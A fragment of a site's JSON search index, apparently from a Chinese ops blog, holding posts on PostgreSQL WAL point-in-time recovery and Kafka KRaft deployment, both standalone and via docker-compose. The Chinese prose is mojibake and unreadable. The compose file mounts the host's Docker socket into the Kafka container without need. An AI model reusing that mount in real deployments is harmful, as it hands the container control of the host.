é€€å‡ºæ¢å¤æ¨¡å¼åï¼Œç¡®è®¤æ˜¯åªè¯»æ¨¡å¼ SELECT pg_is_in_recovery(); # å¦‚æœè¦è¿›å…¥å¯è¯»å¯å†™çš„æ¨¡å¼ select pg_wal_replay_resume(); å››ã€dumpå‡ºæ–°å®ä¾‹æŒ‡å®šè¡¨æˆ–åº“çš„æ•°æ®ï¼Œç„¶åçŒå›æ—§å®ä¾‹çš„æ–°è¡¨æˆ–æ–°åº“ è¿™ä¸ªè¿‡ç¨‹å°±ä¸å¤šè¯´äº†ã€‚\nå¤šè¯´ä¸€å¥ï¼Œå¯ä»¥æ¢å¤åˆ°æŸä¸ªæ—¶é—´ç‚¹ï¼Œäº‹åŠ¡æˆ–è€…walåºåˆ—å·\n# æ¢å¤åˆ°ä¸åŒæ—¶é—´ç‚¹ # å‡è®¾ç¬¬ä¸€æ¬¡æ¢å¤åï¼Œä½ å¸Œæœ›å°è¯•æ¢å¤åˆ°å¦ä¸€ä¸ªæ—¶é—´ç‚¹ï¼Œä¿®æ”¹ postgresql.auto.conf æ–‡ä»¶ä¸­çš„ recovery_target_time ç„¶ååŒæ ·é‡å¤ä»¥ä¸Šæ­¥éª¤å³å¯é‡æ–°æ¢å¤ã€‚ recovery_target_time = \u0026#39;YYYY-MM-DD HH:MI:SS\u0026#39; # ä»¥æŸä¸ªäº‹åŠ¡ä¸ºç›®æ ‡ï¼š recovery_target_xid = \u0026#39;12345\u0026#39; #ä»¥æŸä¸ª WAL æ—¥å¿—åºåˆ—å·ä¸ºç›®æ ‡ï¼š recovery_target_lsn = \u0026#39;0/16B6F98\u0026#39; æ€»ç»“ä¸€ä¸‹ï¼šæ— è®ºpostgresè¿˜æ˜¯mysqlï¼Œä¸€é”®æ¢å¤çš„åŠŸèƒ½ï¼Œæœ€å¥½éƒ½æ˜¯æ–°èµ·ä¸€ä¸ªå®ä¾‹ï¼Œç„¶åæŠŠåŸºç¡€å¤‡ä»½æ¢å¤ä¸Šå»ï¼Œç„¶åç”¨binlogæˆ–walå½’æ¡£æ—¥å¿—è¿›è¡Œæ¢å¤ï¼Œç„¶åå¯¼å‡ºæ•°æ®ï¼Œæœ€åçŒå…¥åˆ°æ—§å®ä¾‹ä¸­ï¼Œè¿™æ ·æœ€ç¨³å¦¥ï¼Œæ—§å®ä¾‹ä¹Ÿä¸ä¼šåœæœåŠ¡ï¼ï¼ï¼\n","permalink":"https://rendoumi.com/posts/20250728-postgres_wal_pitr/","summary":"\u003cp\u003eç ”ç©¶äº†Postgresçš„åº“æ•°æ®æ¢å¤å’Œè½¬ç§»ï¼Œå†æ¥ç ”ç©¶ä¸€ä¸‹PITRæŒ‰æ—¶é—´ç‚¹æ¢å¤\u003c/p\u003e\n\u003cp\u003eç±»æ¯”åˆ°MySQLï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯è¿ç»´ï¼Œä¸æ˜¯ä¸“ä¸šçš„DBAï¼Œæ‰€ä»¥æ¢å¤åˆ°æ­£ç¡®æ•°æ®å³å¯\u003c/p\u003e\n\u003cp\u003eé‚£è·Ÿé˜¿é‡Œäº‘ä»¥åŠè‡ªå»ºçš„MySQLæ¢å¤ä¸€æ ·ï¼Œé¦–å…ˆéƒ½è¦æœ‰ä¸€ä¸ªæ¯å¤©çš„åŸºç¡€å¤‡ä»½ï¼Œç„¶åç±»æ¯”MySQLçš„Binlogï¼ŒPostgresè¿™é‡Œå°±ç›¸å½“äºwalã€‚\u003c/p\u003e\n\u003cp\u003eè¿™ä¹ˆç±»æ¯”å°±å¯¹äº†ï¼Œé‚£ä¹ˆæ¢å¤è¿‡ç¨‹çš„æ€è·¯æ˜¯ä¸€æ ·çš„ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eé¦–å…ˆå»ºç«‹ä¸€ä¸ªæ–°çš„å®ä¾‹\u003c/li\u003e\n\u003cli\u003eç¬¬äºŒæ­¥æŠŠæ¯å¤©çš„åŸºç¡€ç‰©ç†å…¨å¤‡ç»™æ¢å¤ä¸Šå»\u003c/li\u003e\n\u003cli\u003eç¬¬ä¸‰æ­¥æŠŠä¹‹åçš„walæ—¥å¿—ä¼ åˆ°æ–°å®ä¾‹ï¼Œæ¢å¤åˆ°æŒ‡å®šæ—¶é—´ç‚¹\u003c/li\u003e\n\u003cli\u003eç¬¬å››æ­¥æœ€åæŠŠè¡¨æˆ–åº“Dumpä¸‹æ¥ï¼ŒçŒå…¥åˆ°æ—§å®ä¾‹çš„æ–°è¡¨æˆ–æ–°åº“\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eé‚£æˆ‘ä»¬ä¸€æ­¥ä¸€æ­¥æ¥è§£é‡Šï¼š\u003c/p\u003e\n\u003ch5 id=\"ä¸€æ¯å¤©å»ºç«‹ä¸€ä¸ªåŸºç¡€å¤‡ä»½è¿™æ ·åœ¨baseåŸºç¡€ä¸Šåªéœ€æ¢å¤å½“å¤©çš„walé€Ÿåº¦å¤Ÿå¿«\"\u003eä¸€ã€æ¯å¤©å»ºç«‹ä¸€ä¸ªåŸºç¡€å¤‡ä»½ï¼Œè¿™æ ·åœ¨BaseåŸºç¡€ä¸Šï¼Œåªéœ€æ¢å¤å½“å¤©çš„walï¼Œé€Ÿåº¦å¤Ÿå¿«\u003c/h5\u003e\n\u003cp\u003eå»ºç«‹æ¯å¤©çš„BaseåŸºç¡€ç‰©ç†å¤‡ä»½\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epg_basebackup -Ft -Pv -Xf -z -Z5 -U postgres -h localhost -p \u003cspan class=\"m\"\u003e5432\u003c/span\u003e -D /pg_backup\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eè§£é‡Šä¸€ä¸‹ï¼š\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    -Ftï¼š\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        æŒ‡å®šå¤‡ä»½æ ¼å¼ä¸º tarã€‚\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        å¦‚æœä½¿ç”¨ tar æ ¼å¼ï¼Œå¤‡ä»½ä¼šè¾“å‡º tar æ–‡ä»¶ï¼Œå¹¶ä¸”ä¸éœ€è¦ç›´æ¥è®¿é—® PostgreSQL æ•°æ®ç›®å½•ã€‚\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    -Pvï¼š\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        -Pï¼šæ˜¾ç¤ºå¤‡ä»½è¿›åº¦ã€‚\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        -vï¼šå¯ç”¨è¯¦æƒ…æ¨¡å¼ï¼ˆverboseï¼‰ï¼Œæ˜¾ç¤ºæ›´å¤šæ—¥å¿—ã€‚\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    -Xfï¼š\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        -Xï¼šæ§åˆ¶ WAL æ—¥å¿—çš„å¤„ç†æ–¹å¼ï¼Œf è¡¨ç¤ºåœ¨å¤‡ä»½ä¸­åŒ…å« WAL æ–‡ä»¶ï¼ˆWrite Ahead Logsï¼‰ï¼Œç¡®ä¿å¤‡ä»½å¯ä»¥ç”¨äºæ¢å¤åˆ°å®Œæ•´çš„ä¸€è‡´çŠ¶æ€ã€‚\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    -zï¼š\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        å¯ç”¨å‹ç¼©åŠŸèƒ½ã€‚\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    -Z5ï¼š\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        è®¾ç½®å‹ç¼©çº§åˆ«ä¸º 5ï¼ˆå‹ç¼©çº§åˆ«ä» \u003cspan class=\"m\"\u003e0\u003c/span\u003e åˆ° 9ï¼Œ9 ä¸ºæœ€é«˜å‹ç¼©ï¼‰ã€‚\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    -U postgresï¼š\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ä½¿ç”¨ postgres ç”¨æˆ·æ¥è¿æ¥æ•°æ®åº“ã€‚\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    -h localhostï¼š\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        æŒ‡å®šæ•°æ®åº“ä¸»æœºä¸ºå½“å‰æœºå™¨ï¼ˆlocalhostï¼‰ã€‚\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    -p 5432ï¼š\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        æŒ‡å®š PostgreSQL ç›‘å¬ç«¯å£ä¸º 5432ï¼ˆé»˜è®¤ç«¯å£ï¼‰ã€‚\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    -D /pg_backupï¼š\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        å°†å¤‡ä»½æ–‡ä»¶ä¿å­˜åˆ°æŒ‡å®šè·¯å¾„ /pg_backup ä¸­ã€‚\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™æ ·æˆ‘ä»¬å°±åœ¨ /pg_backup ä¸­æœ‰äº†å¤‡ä»½æ–‡ä»¶ï¼ŒåŒ…æ‹¬ä¸€ä¸ªbackup_manifestçš„æ–‡ä»¶æ¸…å•ï¼Œä»¥åŠä¸€ä¸ªå‹ç¼©åŒ…\u003c/p\u003e","title":"Postgresçš„walå’ŒPITRæ—¶é—´ç‚¹æ¢å¤"},{"content":"ä¸Šä¸€ç¯‡è¯´äº†ç”¨Dockeréƒ¨ç½²kafkaï¼Œåç«¯ä¸ç”¨zookeeperï¼Œæ”¹ç”¨kraftã€‚\nè¿™ä¸€ç¯‡è¯´è¯´ä¸ç”¨Dockerï¼Œç›´æ¥å•æœºéƒ¨ç½²kafkaç”¨kraftçš„æ–¹æ³•ã€‚\nä¸€ã€å‡†å¤‡ï¼Œè™šæœºçš„è¯éœ€è¦4cpu 8Gå†…å­˜\n# è£…å¥½java java --version å»º3ä¸ªç›®å½• # æ”¾kafkaçš„2è¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ mkdir -p /opt/kafka # æ”¾kafkaçš„æ—¥å¿—æ–‡ä»¶ mkdir -p /var/log/kafka # æ”¾kafkaçš„æ•°æ®æ–‡ä»¶ mkdir -p /var/lib/kafka äºŒã€ä¸‹è½½å¹¶é…ç½®kafka\n# é‡Šæ”¾åˆ°æŒ‡å®šç›®å½• tar -xzf kafka_2.13-3.5.0.tgz -C /opt/kafka # ä¿®æ”¹/opt/kafka/config/server.properties process.roles=broker,controller node.id=1 controller.quorum.voters=1@localhost:9093 listeners=PLAINTEXT://localhost:9092,CONTROLLER://localhost:9093 log.dirs=/var/lib/kafka # ç„¶åéœ€è¦å†è¿½åŠ åˆ°server.propertiesçš„éƒ¨åˆ† metadata.log.dir=/var/lib/kafka/metadata num.replica.fetchers=1 offsets.topic.replication.factor=1 transaction.state.log.replication.factor=1 transaction.state.log.min.isr=1 ä¸‰ã€åˆå§‹åŒ–kafkaé›†ç¾¤\n# ç”Ÿæˆä¸€ä¸ªuuid uuidgen dc66bcb0-758e-4360-843d-5ccb1da2ee74 # åˆå§‹åŒ– cd /opt/kafka bin/kafka-storage.sh format -t \u0026lt;UUID\u0026gt; -c config/server.properties # å¯åŠ¨ bin/kafka-server-start.sh config/server.properties # æ£€æŸ¥ä¸€ä¸‹ä»£ç†çš„çŠ¶æ€ bin/kafka-broker-api-versions.sh --bootstrap-server localhost:9092 å››ã€æ¨é€æ•°æ®éªŒè¯\n# åˆ›å»ºtopic bin/kafka-topics.sh --create --topic my-new-topic --bootstrap-server localhost:9092 --partitions 3 --replication-factor 1 # åˆ—å‡ºtopic bin/kafka-topics.sh --list --bootstrap-server localhost:9092 # çœ‹çœ‹topicçš„å±æ€§ bin/kafka-topics.sh --describe --topic my-new-topic --bootstrap-server localhost:9092 # ç”Ÿäº§ä¸€äº›æ¶ˆæ¯æ”¾è¿›topic bin/kafka-console-producer.sh --topic my-new-topic --bootstrap-server localhost:9092 # æ¶ˆè´¹è¿™äº›æ¶ˆæ¯ bin/kafka-console-consumer.sh --topic my-new-topic --from-beginning --bootstrap-server localhost:9092 # å¦‚ä½•é‡åˆ°é—®é¢˜ï¼ŒæŸ¥çœ‹æ—¥å¿— tail -f /var/log/kafka/server.log ","permalink":"https://rendoumi.com/posts/20250728-kafka_kraft_alone/","summary":"\u003cp\u003eä¸Šä¸€ç¯‡è¯´äº†ç”¨Dockeréƒ¨ç½²kafkaï¼Œåç«¯ä¸ç”¨zookeeperï¼Œæ”¹ç”¨kraftã€‚\u003c/p\u003e\n\u003cp\u003eè¿™ä¸€ç¯‡è¯´è¯´ä¸ç”¨Dockerï¼Œç›´æ¥å•æœºéƒ¨ç½²kafkaç”¨kraftçš„æ–¹æ³•ã€‚\u003c/p\u003e\n\u003cp\u003eä¸€ã€å‡†å¤‡ï¼Œè™šæœºçš„è¯éœ€è¦4cpu 8Gå†…å­˜\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# è£…å¥½java\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ejava --version\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eå»º3ä¸ªç›®å½•\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# æ”¾kafkaçš„2è¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p /opt/kafka  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# æ”¾kafkaçš„æ—¥å¿—æ–‡ä»¶\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p /var/log/kafka\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# æ”¾kafkaçš„æ•°æ®æ–‡ä»¶\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p /var/lib/kafka\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eäºŒã€ä¸‹è½½å¹¶é…ç½®kafka\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# é‡Šæ”¾åˆ°æŒ‡å®šç›®å½•\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar -xzf kafka_2.13-3.5.0.tgz -C /opt/kafka\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ä¿®æ”¹/opt/kafka/config/server.properties\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eprocess.roles\u003cspan class=\"o\"\u003e=\u003c/span\u003ebroker,controller\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enode.id\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econtroller.quorum.voters\u003cspan class=\"o\"\u003e=\u003c/span\u003e1@localhost:9093\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003elisteners\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ePLAINTEXT://localhost:9092,CONTROLLER://localhost:9093\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elog.dirs\u003cspan class=\"o\"\u003e=\u003c/span\u003e/var/lib/kafka\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ç„¶åéœ€è¦å†è¿½åŠ åˆ°server.propertiesçš„éƒ¨åˆ†\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emetadata.log.dir\u003cspan class=\"o\"\u003e=\u003c/span\u003e/var/lib/kafka/metadata\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enum.replica.fetchers\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eoffsets.topic.replication.factor\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etransaction.state.log.replication.factor\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etransaction.state.log.min.isr\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸‰ã€åˆå§‹åŒ–kafkaé›†ç¾¤\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ç”Ÿæˆä¸€ä¸ªuuid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003euuidgen\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edc66bcb0-758e-4360-843d-5ccb1da2ee74\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# åˆå§‹åŒ–\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /opt/kafka\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebin/kafka-storage.sh format -t \u0026lt;UUID\u0026gt; -c config/server.properties\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# å¯åŠ¨\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebin/kafka-server-start.sh config/server.properties\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# æ£€æŸ¥ä¸€ä¸‹ä»£ç†çš„çŠ¶æ€\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebin/kafka-broker-api-versions.sh --bootstrap-server localhost:9092\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå››ã€æ¨é€æ•°æ®éªŒè¯\u003c/p\u003e","title":"å•æœºéƒ¨ç½²kafkaç”¨kraftä¸ä¾èµ–zookeeper"},{"content":"ç”¨redpandaå±…ç„¶è¿˜è¦æ¯éš”30å¤©æ›´æ–°ä¸€ä¸‹Licenseæ–‡ä»¶ï¼Œå”å¯å¿å©¶ä¸å¯å¿å•Šã€‚\næ¢æ‰æ¢æ‰ï¼Œç›´æ¥ç”¨Dockeréƒ¨ç½²kafkaï¼Œåç«¯ä¸ç”¨zookeeperï¼Œç”¨kraftï¼Œå¤©ä¸‹è‹¦zkä¹Ÿä¹…çŸ£ï¼\næ–¹æ³•å¾ˆç®€å•ï¼Œç”¨docker-composeï¼Œç¼–è¾‘docker-compose.ymlæ–‡ä»¶\nname: \u0026#39;stream\u0026#39; services: kafka: image: confluentinc/cp-kafka:latest hostname: kafka container_name: kafka ports: - 9092:9092 - 9093:9093 environment: KAFKA_KRAFT_MODE: true # This enables KRaft mode in Kafka. KAFKA_PROCESS_ROLES: controller,broker # Kafka acts as both broker and controller. KAFKA_NODE_ID: 1 # A unique ID for this Kafka instance. KAFKA_CONTROLLER_QUORUM_VOTERS: 1@10.8.1.119:9093 # Defines the controller voters. KAFKA_LISTENERS: PLAINTEXT://0.0.0.0:9092,CONTROLLER://0.0.0.0:9093 KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: PLAINTEXT:PLAINTEXT,CONTROLLER:PLAINTEXT KAFKA_INTER_BROKER_LISTENER_NAME: PLAINTEXT KAFKA_CONTROLLER_LISTENER_NAMES: CONTROLLER KAFKA_ADVERTISED_LISTENERS: PLAINTEXT://10.8.1.119:9092 KAFKA_LOG_DIRS: /var/lib/kafka/data # Where Kafka stores its logs. KAFKA_AUTO_CREATE_TOPICS_ENABLE: true # Kafka will automatically create topics if needed. KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR: 1 # Since weâ€™re running one broker, one replica is enough. KAFKA_LOG_RETENTION_HOURS: 168 # Keep logs for 7 days. KAFKA_GROUP_INITIAL_REBALANCE_DELAY_MS: 0 # No delay for consumer rebalancing. CLUSTER_ID: Mk3OEYBSD34fcwNTJENDM2Qk # A unique ID for the Kafka cluster. volumes: - /var/run/docker.sock:/var/run/docker.sock - ./data:/var/lib/kafka/data # Store Kafka logs on your local machine. æ³¨æ„ä»¥ä¸Šçš„æ–‡ä»¶ï¼Œæš´éœ²äº†2ä¸ªç«¯å£ï¼Œ9092å’Œ9093ï¼Œ9092ç”¨äºå®¢æˆ·ç«¯è¿æ¥ï¼Œ9093ç”¨äºé›†ç¾¤é€šè®¯ï¼›KAFKA_KRAFT_MODE: trueç”¨kraftä¸ç”¨zk. ClUSTER_IDå¯ä»¥æ¢ä¸ªä¸åŒçš„ã€‚\nå¦å¤–é…ç½®æœ‰ä¸¤ä¸ª10.8.1.119åœ°å€ï¼Œè¿™æ˜¯Dockerå®¿ä¸»æœºçš„ipï¼Œè¿™æ˜¯å¯¹å¤–å¼€æ”¾å¿…é¡»è¦æ”¹çš„ã€‚ ç„¶åæ–‡ä»¶å·ï¼Œdocker-compose.ymlæ–‡ä»¶çš„åŒçº§ç›®å½•æœ‰ä¸ªdataæ–‡ä»¶å¤¹ï¼Œè¿™ä¸ªæ–‡ä»¶å¤¹çš„å±ä¸»å¿…é¡»æ˜¯id=1000çš„ç”¨æˆ·ï¼Œåœ¨æˆ‘ä»¬çš„ç³»ç»Ÿä¸­æ˜¯ç¬¬ä¸€ä¸ªæ·»åŠ çš„ç”¨æˆ·ï¼Œdebian\næ‰€ä»¥è¦è®¾ç½®ä¸€ä¸‹å±ä¸»ï¼š\nchown -R debian:debian data å¦‚æœå±ä¸»ä¸æ˜¯1000ï¼Œä¼šçˆ†å‡ºä»¥ä¸‹æŠ¥é”™ä¿¡æ¯å¹¶é€€å‡ºï¼š\nkafka | ===\u0026gt; User kafka | uid=1000(appuser) gid=1000(appuser) groups=1000(appuser) kafka | ===\u0026gt; Configuring ... kafka | ===\u0026gt; Running preflight checks ... kafka | ===\u0026gt; Check if /var/lib/kafka/data is writable ... kafka | Command [/usr/local/bin/dub path /var/lib/kafka/data writable] FAILED ! kafka exited with code 1 ç„¶åå¯åŠ¨å³å¯ï¼š\ndocker-compose up -d éšåæµ‹è¯•ä¸€ä¸‹ï¼š\n#è¿›å…¥å®¹å™¨bash docker exec -it kafka bash #å»ºç«‹ä¸€ä¸ªtest-topic /usr/bin/kafka-topics --create --topic test-topic --bootstrap-server localhost:9092 --partitions 1 --replication-factor 1 #å‘ç‚¹æ¶ˆæ¯è¿›å» /usr/bin/kafka-console-producer --broker-list localhost:9092 --topic test-topic \u0026gt; Hello Kafka! \u0026gt; This is a test message. #å¦å¤–ä¸€ä¸ªå®¢æˆ·ç«¯æ”¶æ¶ˆæ¯ /usr/bin/kafka-console-consumer --bootstrap-server localhost:9092 --topic test-topic - Hello Kafka! This is a test message. #æŸ¥çœ‹æ‰€æœ‰çš„topics /usr/bin/kafka-topics --list --bootstrap-server localhost:9092 ","permalink":"https://rendoumi.com/posts/20250728-kafka_kraft_docker/","summary":"\u003cp\u003eç”¨\u003ccode\u003eredpanda\u003c/code\u003eå±…ç„¶è¿˜è¦æ¯éš”30å¤©æ›´æ–°ä¸€ä¸‹Licenseæ–‡ä»¶ï¼Œå”å¯å¿å©¶ä¸å¯å¿å•Šã€‚\u003c/p\u003e\n\u003cp\u003eæ¢æ‰æ¢æ‰ï¼Œç›´æ¥ç”¨Dockeréƒ¨ç½²kafkaï¼Œåç«¯ä¸ç”¨zookeeperï¼Œç”¨kraftï¼Œå¤©ä¸‹è‹¦zkä¹Ÿä¹…çŸ£ï¼\u003c/p\u003e\n\u003cp\u003eæ–¹æ³•å¾ˆç®€å•ï¼Œç”¨docker-composeï¼Œç¼–è¾‘\u003ccode\u003edocker-compose.yml\u003c/code\u003eæ–‡ä»¶\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ename: \u003cspan class=\"s1\"\u003e\u0026#39;stream\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eservices:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  kafka:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    image: confluentinc/cp-kafka:latest\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    hostname: kafka\n\u003c/span\u003e\u003c/span\u003e\u003cspan 